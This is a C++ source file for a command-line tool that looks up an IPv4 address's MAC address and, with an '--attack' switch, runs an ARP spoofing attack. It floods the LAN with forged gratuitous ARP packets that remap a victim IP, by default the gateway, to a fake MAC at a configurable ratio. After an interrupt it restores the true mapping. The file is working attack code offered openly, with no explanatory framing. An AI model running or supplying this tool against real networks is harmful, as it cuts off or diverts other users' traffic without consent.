#include "traffic/transport.h"
#include "toolkit/logging.h"
#include "toolkit/args.h"
#include "toolkit/toolkit.h"
#include <signal.h>
#include <atomic>
#include <thread>

std::atomic<bool> end_attack = false;

void onInterrupt(int)
{
    ILOG("about to stop attack...");
    end_attack = true;
}

int main(int argc, char* argv[])
{
    MY_TRY
    toolkit::Args args(argc, argv);
    args.positional("ip", po::value<std::string>()->default_value(""), "ipv4 address", 1);
    args.optional("attack,a", po::bool_switch(), "deploy arp attack");
    args.optional("per,p", po::value<int>()->default_value(500), "send period (ms)");
    args.optional("ratio,r", po::value<float>()->default_value(100), "attack ratio (%)");
    CHECK_ERR_RET_INT(args.parse());

    auto opt_ip = args.get<std::string>("ip");
    auto opt_attack = args.get<bool>("attack");
    auto opt_per = args.get<int>("per");
    auto opt_ratio = args.get<float>("ratio");

    if (opt_ip.empty() && !opt_attack) {
        ELOG("empty ipv4 address, please input ip");
        return -1;
    }

    net::Ip4 ip = !opt_ip.empty() ? net::Ip4(opt_ip) : net::Ip4::kZeros;
    auto& apt = net::Adaptor::fit(ip);
    void* handle;
    CHECK_ERR_RET_INT(net::Transport::open(apt, handle));
    auto handle_guard = toolkit::scopeExit([&] { net::Transport::close(handle); });

    if (!opt_attack) {
        net::Mac mac;
        if (net::Transport::ip2mac(handle, ip, mac) == MyErrCode::kOk) {
            ILOG("{} is at {}", ip, mac);
        } else {
            ILOG("{} is offline", ip);
        }
    } else {
        signal(SIGINT, onInterrupt);
        net::Ip4 victim_ip = !opt_ip.empty() ? net::Ip4(opt_ip) : apt.gateway;
        net::Mac victim_actual_mac;
        if (net::Transport::ip2mac(handle, victim_ip, victim_actual_mac) == MyErrCode::kOk) {
            ILOG("victim {} is at {}", victim_ip, victim_actual_mac);
        }
        net::Mac victim_forged_mac = victim_actual_mac;
        victim_forged_mac.b6 += 1;
        ILOG("forging victim's mac to {}...", victim_forged_mac);
        ILOG("send period is {}ms, attack ratio {:.3f}%", opt_per, opt_ratio);
        int lie_per = opt_per * (opt_ratio / 100.0);
        int true_per = opt_per - lie_per;
        auto lie =
            net::Packet::arp(victim_forged_mac, victim_ip, victim_forged_mac, victim_ip, true);
        auto truth =
            net::Packet::arp(victim_actual_mac, victim_ip, victim_actual_mac, victim_ip, true);
        while (!end_attack) {
            if (lie_per > 0) {
                CHECK_ERR_RET_INT(net::Transport::send(handle, lie));
                std::this_thread::sleep_for(std::chrono::milliseconds(lie_per));
            }
            if (true_per > 0) {
                CHECK_ERR_RET_INT(net::Transport::send(handle, truth));
                std::this_thread::sleep_for(std::chrono::milliseconds(true_per));
            }
        }
        ILOG("attack stopped");
        if (net::Transport::ip2mac(handle, victim_ip, victim_actual_mac, false) == MyErrCode::kOk) {
            truth =
                net::Packet::arp(victim_actual_mac, victim_ip, victim_actual_mac, victim_ip, true);
            for (int i = 0; i < 5; ++i) {
                CHECK_ERR_RET_INT(net::Transport::send(handle, truth));
                std::this_thread::sleep_for(std::chrono::milliseconds(100));
            }
            ILOG("victim's mac restored to {}", victim_actual_mac);
        }
    }
    MY_CATCH_RET_INT
}
